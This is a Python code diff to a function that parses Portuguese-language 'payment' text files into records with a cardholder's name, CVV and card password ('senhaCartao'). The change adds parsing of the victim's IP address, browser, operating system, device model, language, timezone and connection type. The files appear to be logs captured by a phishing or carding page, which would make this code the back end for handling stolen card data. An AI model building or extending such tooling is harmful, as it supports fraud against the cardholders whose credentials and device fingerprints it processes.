@@ -772,7 +772,18 @@ def parse_payment_file(content: str, file_path: Path) -> dict:
             'cvv': '',
             'senhaCartao': '',
             'dataCriacao': file_path.parent.name,  # Date folder
-            'status': 'processado'
+            'status': 'processado',
+            # Device information
+            'ip': None,
+            'browserName': None,
+            'browserVersion': None,
+            'osName': None,
+            'osVersion': None,
+            'deviceType': None,
+            'deviceModel': None,
+            'language': None,
+            'timezone': None,
+            'connectionType': None,
         }
 
         # Parse each line
@@ -791,6 +802,34 @@ def parse_payment_file(content: str, file_path: Path) -> dict:
                 data['senhaCartao'] = line.split('Senha do Cartão:')[1].strip()
             elif 'Data/Hora:' in line and data['dataCriacao'] == file_path.parent.name:
                 data['dataCriacao'] = line.split('Data/Hora:')[1].strip()
+            # Device information parsing
+            elif 'IP:' in line and 'INFORMAÇÕES DO DISPOSITIVO' not in line:
+                data['ip'] = line.split('IP:')[1].strip()
+            elif 'Navegador:' in line:
+                browser_info = line.split('Navegador:')[1].strip()
+                data['browserName'] = browser_info.split(' v')[0] if ' v' in browser_info else browser_info
+                if ' v' in browser_info:
+                    data['browserVersion'] = browser_info.split(' v')[1]
+            elif 'Sistema Operacional:' in line:
+                os_info = line.split('Sistema Operacional:')[1].strip()
+                parts = os_info.split()
+                if parts:
+                    data['osName'] = parts[0]
+                    if len(parts) > 1:
+                        data['osVersion'] = ' '.join(parts[1:])
+            elif 'Tipo de Dispositivo:' in line:
+                device_info = line.split('Tipo de Dispositivo:')[1].strip()
+                if ' - ' in device_info:
+                    data['deviceType'] = device_info.split(' - ')[0]
+                    data['deviceModel'] = device_info.split(' - ')[1]
+                else:
+                    data['deviceType'] = device_info
+            elif 'Idioma:' in line:
+                data['language'] = line.split('Idioma:')[1].strip()
+            elif 'Fuso Horário:' in line:
+                data['timezone'] = line.split('Fuso Horário:')[1].strip()
+            elif 'Tipo de Conexão:' in line:
+                data['connectionType'] = line.split('Tipo de Conexão:')[1].strip().split('(')[0].strip()
 
         return data if data['nomeCompleto'] else None
     except Exception as e:
